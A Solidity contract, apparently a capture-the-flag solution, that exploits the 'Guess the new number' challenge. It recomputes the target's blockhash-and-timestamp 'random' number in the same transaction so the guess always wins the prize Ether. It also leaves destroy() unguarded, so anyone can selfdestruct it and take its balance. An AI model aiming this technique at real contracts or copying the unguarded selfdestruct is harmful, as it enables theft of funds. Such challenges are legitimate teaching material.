pragma solidity ^0.4.26;

import "./GuessTheNewNumberChallengeInterface.sol";

contract ProxyContract {
  constructor() public payable {}

  // Fallback payable function necessary otherwise win function would revert.
  // Fallback functions are executed when a contract receives plain Ether without
  // any other data associated with the transaction. In this case, when guess function
  // is called and answer is correct (as it should be), 2 ethers will be transfered
  // to ProxyContract (and no data is sent).
  //
  function() public payable {}

  uint8 lastAnswer;

  function win(address _addr) public payable {
    GuessTheNewNumberChallengeInterface target = GuessTheNewNumberChallengeInterface(_addr);

    uint8 answer = uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), now)));

    target.guess.value(msg.value)(answer);

    lastAnswer = answer;
  }

  // helper to double-check answer was calculated
  function getLastAnswer() public view returns(uint8) {
    return lastAnswer;
  }

  // needless to say but still, call function with
  // `send` and respective account instead of `call`
  function destroy() public {
    selfdestruct(msg.sender);
  }
}
